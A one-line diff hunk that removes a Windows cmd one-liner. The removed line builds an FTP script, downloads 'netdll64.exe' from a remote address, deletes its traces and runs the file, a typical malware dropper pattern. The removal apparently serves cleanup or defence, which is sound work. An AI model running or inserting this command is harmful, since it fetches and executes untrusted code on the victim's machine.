@@ -1,1 +1,0 @@
-cmd /c echo open 0.0.0.0 61867 >> ii &echo user 1 1 >> ii &echo get netdll64.exe >> ii &echo bye >> ii &ftp -n -v -s:ii &del ii &netdll64.exe
